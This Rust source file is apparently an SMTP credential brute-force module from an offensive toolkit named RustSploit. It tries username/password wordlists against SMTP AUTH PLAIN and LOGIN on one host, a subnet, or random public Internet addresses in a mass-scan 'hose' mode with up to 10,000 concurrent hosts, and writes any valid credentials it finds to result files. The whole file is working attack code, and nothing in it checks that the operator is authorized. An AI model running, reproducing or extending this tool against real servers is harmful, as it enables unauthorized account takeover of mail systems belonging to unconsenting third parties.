use anyhow::{anyhow, Context, Result};
use colored::*;
use std::net::{ToSocketAddrs, IpAddr, SocketAddr};
use std::net::TcpStream;
use std::sync::{
    atomic::{AtomicBool, AtomicUsize, Ordering},
    Arc,
};
use std::time::Duration;
use tokio::sync::{Mutex, Semaphore};
use futures::stream::{FuturesUnordered, StreamExt};
use std::io::{BufRead, BufReader, Write};
use base64::{engine::general_purpose, Engine as _};
use tokio::io::AsyncWriteExt;
use tokio::fs::OpenOptions;

use crate::utils::{
    load_lines,
    cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
};
use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions, is_subnet_target, parse_subnet, subnet_host_count};

const STATE_FILE: &str = "smtp_hose_state.log";
const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;

// Hardcoded exclusions
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    // Cloudflare
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    // Google
    "8.8.8.8/32", "8.8.4.4/32"
];

#[derive(Clone)]
struct SmtpBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    output_file: String,
    delay_ms: u64,
}

pub async fn run(target: &str) -> Result<()> {
    println!("\n{}", "=== SMTP Bruteforce Module (RustSploit) ===".bold().cyan());
    println!();

    // Check for Mass Scan Mode conditions
    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();

    if is_mass_scan {
        println!("{}", format!("[*] Target: {}", target).cyan());
        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
        return run_mass_scan(target).await;
    }

    if is_subnet_target(target) {
        println!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
        return run_subnet_scan(target).await;
    }

    // --- Standard Single Target Logic ---
    
    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file")?;
    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file")?;
    
    let threads = cfg_prompt_int_range("threads", "Threads", 8, 1, 256)? as usize;
    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000)? as u64;
    
    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", true)?;
    let full_combo = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false)?;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "smtp_results.txt")?;

    let config = SmtpBruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        output_file,
        delay_ms,
    };

    println!();
    run_smtp_bruteforce(config).await
}

async fn run_mass_scan(target: &str) -> Result<()> {
    // Prep
    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
    
    let users = load_lines(&usernames_file)?;
    let pass_lines = load_lines(&passwords_file)?;

    if users.is_empty() { return Err(anyhow!("User list empty")); }
    if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }

    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts to scan", 500, 1, 10000)? as usize;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?; 
    let output_file = cfg_prompt_output_file("output_file", "Output result file", "smtp_mass_results.txt")?;

    // Parse exclusions
    let exclusions = Arc::new(parse_exclusions(EXCLUDED_RANGES));

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));

    let creds_pkg = Arc::new((users, pass_lines));

    // Stats
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs scanned, {} valid SMTP credentials found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";

    if run_random {
        println!("{}", "[*] Starting Random Internet Scan...".green());
        loop {
             let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
             let exc = exclusions.clone();
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             tokio::spawn(async move {
                 let ip = generate_random_public_ip(&exc);
                 if !is_ip_checked(&ip, STATE_FILE).await {
                     mark_ip_checked(&ip, STATE_FILE).await;
                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
                 }
                 sc.fetch_add(1, Ordering::Relaxed);
                 drop(permit);
             });
        }
    } else {
        // File Mode
        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());

        for ip_str in lines {
             let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             if let Ok(ip) = ip_str.parse::<IpAddr>() {
                 tokio::spawn(async move {
                    if !is_ip_checked(&ip, STATE_FILE).await {
                        mark_ip_checked(&ip, STATE_FILE).await;
                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
                    }
                    sc.fetch_add(1, Ordering::Relaxed);
                    drop(permit);
                 });
             } else {
                 drop(permit); 
             }
        }
        for _ in 0..concurrency {
            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
        }
    }
    
    Ok(())
}

async fn run_subnet_scan(target: &str) -> Result<()> {
    let network = parse_subnet(target)?;
    let count = subnet_host_count(&network);
    println!("{}", format!("[*] Subnet {} — {} hosts to scan", target, count).cyan());

    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
    let users = load_lines(&usernames_file)?;
    let passes = load_lines(&passwords_file)?;
    if users.is_empty() { return Err(anyhow!("User list empty")); }
    if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)? as usize;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
    let output_file = cfg_prompt_output_file("output_file", "Output result file", "smtp_subnet_results.txt")?;

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));
    let creds_pkg = Arc::new((users, passes));
    let total = count;

    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!("[*] Status: {}/{} IPs scanned, {} valid credentials found",
                s_checked.load(Ordering::Relaxed), total,
                s_found.load(Ordering::Relaxed).to_string().green().bold());
        }
    });

    for ip in network.iter() {
        let permit = semaphore.clone().acquire_owned().await.context("Semaphore")?;
        let cp = creds_pkg.clone();
        let sc = stats_checked.clone();
        let sf = stats_found.clone();
        let of = output_file.clone();

        tokio::spawn(async move {
            mass_scan_host(ip, port, cp, sf, of, verbose).await;
            sc.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }

    for _ in 0..concurrency {
        let _ = semaphore.acquire().await.context("Semaphore")?;
    }

    println!("\n{}", format!("[*] Subnet scan complete. {} hosts scanned, {} credentials found.",
        stats_checked.load(Ordering::Relaxed),
        stats_found.load(Ordering::Relaxed)).cyan().bold());
    Ok(())
}

async fn mass_scan_host(
    ip: IpAddr, 
    port: u16,
    creds: Arc<(Vec<String>, Vec<String>)>,
    stats_found: Arc<AtomicUsize>,
    output_file: String,
    verbose: bool
) {
    let sa = SocketAddr::new(ip, port);
    
    // 1. Connection Check
    if tokio::time::timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), tokio::net::TcpStream::connect(&sa)).await.is_err() {
        return;
    }

    let (users, passes) = &*creds;

    // 2. Bruteforce
    // Reuse existing blocking sync function inside spawn_blocking?
    // The existing function uses std::net::TcpStream blocking.
    // That's fine for small lists, but suboptimal for high concurrency.
    // However, since we are inside a spawned tokio task, spawn_blocking is appropriate.
    
    let target_str = ip.to_string();

    for user in users {
        for pass in passes {
            let t_target = target_str.clone();
            let t_user = user.clone();
            let t_pass = pass.clone();
            let t_port = port;
            
            let t_target_inner = t_target.clone();
            let t_user_inner = t_user.clone();
            let t_pass_inner = t_pass.clone();
            
            // Blocking call for the actual SMTP interaction (since it uses blocking Telnet/TcpStream)
            let res = tokio::task::spawn_blocking(move || {
                try_smtp_login(&t_target_inner, t_port, &t_user_inner, &t_pass_inner)
            }).await;

            match res {
                Ok(Ok(true)) => {
                    let msg = format!("{} -> {}:{}", t_target, t_user, t_pass);
                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                       let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
                    }
                    stats_found.fetch_add(1, Ordering::Relaxed);
                    return; // Stop after first success
                }
                Ok(Ok(false)) => {
                    if verbose {
                        // Auth failed
                    }
                }
                Ok(Err(e)) => {
                     // Connection error
                     let err = e.to_string().to_lowercase();
                     if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
                         return; // Stop scanning host
                     }
                }
                Err(_) => {
                    // Start/Join error
                }
            }
        }
    }
}

async fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
    let usernames = load_lines(&config.username_wordlist)?;
    let passwords = load_lines(&config.password_wordlist)?;
    
    let total_attempts = if config.full_combo {
        usernames.len() * passwords.len()
    } else {
        std::cmp::max(usernames.len(), passwords.len())
    };

    println!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
    println!("[*] Total attempts: {}", total_attempts);

    let stats = Arc::new(BruteforceStats::new());
    let found_creds = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let start_time = std::time::Instant::now();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        while !stop_clone.load(Ordering::Relaxed) {
             tokio::time::sleep(Duration::from_secs(2)).await;
             stats_clone.print_progress();
        }
    });

    let semaphore = Arc::new(Semaphore::new(config.threads));
    let mut tasks = FuturesUnordered::new();

    // Generate combinations
    let mut combos = Vec::new();
    if config.full_combo {
        for u in &usernames {
            for p in &passwords {
                combos.push((u.clone(), p.clone()));
            }
        }
    } else {
        let max_len = std::cmp::max(usernames.len(), passwords.len());
        for i in 0..max_len {
            let u = &usernames[i % usernames.len()];
            let p = &passwords[i % passwords.len()];
            combos.push((u.clone(), p.clone()));
        }
    }

    // Process combinations
    for (user, pass) in combos {
         if config.stop_on_success && stop_signal.load(Ordering::Relaxed) {
            break;
         }

         let permit = semaphore.clone().acquire_owned().await?;
         let config_clone = config.clone();
         let stats_clone = stats.clone();
         let found_clone = found_creds.clone();
         let stop_signal_clone = stop_signal.clone();
         let user_clone = user.clone();
         let pass_clone = pass.clone();

         tasks.push(tokio::spawn(async move {
             let _permit = permit; 
             
             if config_clone.stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                 return;
             }
             
             // Wrap blocking logic
             let config_inner = config_clone.clone();
             let user_inner = user_clone.clone();
             let pass_inner = pass_clone.clone();
             let res = tokio::task::spawn_blocking(move || {
                 match try_smtp_login(&config_inner.target, config_inner.port, &user_inner, &pass_inner) {
                     Ok(true) => Ok(true),
                     Ok(false) => Ok(false),
                     Err(e) => Err(e),
                 }
             }).await;

             match res {
                 Ok(Ok(true)) => {
                     println!("\r{}", format!("[+] Found: {}:{}", user_clone, pass_clone).green().bold());
                     found_clone.lock().await.push((user_clone.clone(), pass_clone.clone()));
                     stats_clone.record_success();
                     if config_clone.stop_on_success {
                         stop_signal_clone.store(true, Ordering::Relaxed);
                     }
                 },
                 Ok(Ok(false)) => {
                     stats_clone.record_failure();
                     if config_clone.verbose {
                         println!("\r{}", format!("[-] Failed: {}:{}", user_clone, pass_clone).dimmed());
                     }
                 },
                 Ok(Err(e)) => {
                     stats_clone.record_error(e.to_string()).await;
                     if config_clone.verbose {
                          println!("\r{}", format!("[!] Error {}:{}: {}", user_clone, pass_clone, e).red());
                     }
                 },
                 Err(e) => {
                      stats_clone.record_error(format!("Task panic: {}", e)).await;
                 }
             }
             
             if config_clone.delay_ms > 0 {
                 tokio::time::sleep(Duration::from_millis(config_clone.delay_ms)).await;
             }
         }));
         
         // Memory management: drain completed tasks
          while let std::task::Poll::Ready(Some(_)) = futures::future::poll_fn(|cx| std::task::Poll::Ready(tasks.poll_next_unpin(cx))).await {}
    }

    while let Some(_) = tasks.next().await {}

    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    
    let elapsed = start_time.elapsed();
    println!("[*] Elapsed: {:.1}s", elapsed.as_secs_f64());
    stats.print_final().await;
    
    // Save results
    let found = found_creds.lock().await;
    if !found.is_empty() {
        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&config.output_file) {
             use std::io::Write;
             for (u, p) in found.iter() {
                let _ = writeln!(file, "{}:{}", u, p);
            }
            println!("[+] Results saved to {}", config.output_file);
        }
    }

    Ok(())
}

/// Read a single SMTP response line (terminated by \n).
/// Returns the trimmed line or an error on timeout / EOF.
fn read_smtp_line(reader: &mut BufReader<&TcpStream>) -> Result<String> {
    let mut line = String::new();
    let n = reader.read_line(&mut line).context("SMTP read")?;
    if n == 0 {
        return Err(anyhow!("Connection closed"));
    }
    Ok(line.trim_end().to_string())
}

fn try_smtp_login(target: &str, port: u16, username: &str, password: &str) -> Result<bool> {
    let addr = format!("{}:{}", target, port);
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(2000))?;
    stream.set_read_timeout(Some(Duration::from_millis(2000)))?;
    stream.set_write_timeout(Some(Duration::from_millis(2000)))?;

    let mut reader = BufReader::new(&stream);
    // We write via a reference to the same stream (TcpStream is duplex)
    let mut writer = &stream;

    // Read banner — expect 220
    let banner = read_smtp_line(&mut reader).context("Banner read")?;
    if !banner.starts_with("220") {
        return Err(anyhow!("No 220 banner"));
    }

    // Send EHLO
    writer.write_all(b"EHLO scanner\r\n")?;
    writer.flush()?;

    let mut login_ok = false;
    let mut plain_ok = false;
    let mut ehlo_seen = false;

    // Read multi-line EHLO response (250-... continues, 250 ... ends)
    for _ in 0..10 {
        let line = read_smtp_line(&mut reader).context("EHLO read")?;
        if line.contains("AUTH") && line.contains("PLAIN") { plain_ok = true; }
        if line.contains("AUTH") && line.contains("LOGIN") { login_ok = true; }
        // "250 " (with space) is the final line of the EHLO response
        if line.starts_with("250 ") { ehlo_seen = true; break; }
        // If the line doesn't start with 250 at all, something is wrong
        if !line.starts_with("250") { break; }
    }
    if !ehlo_seen { return Ok(false); }

    // Try AUTH PLAIN
    if plain_ok {
        let mut blob = vec![0u8];
        blob.extend(username.as_bytes()); blob.push(0); blob.extend(password.as_bytes());
        let cmd = format!("AUTH PLAIN {}\r\n", general_purpose::STANDARD.encode(&blob));
        writer.write_all(cmd.as_bytes())?;
        writer.flush()?;

        let resp = read_smtp_line(&mut reader).context("Auth response")?;
        if resp.starts_with("235") {
            let _ = writer.write_all(b"QUIT\r\n");
            return Ok(true);
        }
        if resp.starts_with("5") { return Ok(false); }
    }

    // Try AUTH LOGIN
    if login_ok {
        writer.write_all(b"AUTH LOGIN\r\n")?;
        writer.flush()?;

        // Wait for username prompt (334)
        let prompt1 = read_smtp_line(&mut reader).context("Auth Login prompt")?;
        if !prompt1.starts_with("334") { return Ok(false); }

        let ucmd = format!("{}\r\n", general_purpose::STANDARD.encode(username.as_bytes()));
        writer.write_all(ucmd.as_bytes())?;
        writer.flush()?;

        // Wait for password prompt (334)
        let prompt2 = read_smtp_line(&mut reader).context("Auth Pass prompt")?;
        if !prompt2.starts_with("334") { return Ok(false); }

        let pcmd = format!("{}\r\n", general_purpose::STANDARD.encode(password.as_bytes()));
        writer.write_all(pcmd.as_bytes())?;
        writer.flush()?;

        let resp = read_smtp_line(&mut reader).context("Auth final response")?;
        if resp.starts_with("235") {
            let _ = writer.write_all(b"QUIT\r\n");
            return Ok(true);
        }
        if resp.starts_with("5") { return Ok(false); }
    }

    Ok(false)
}

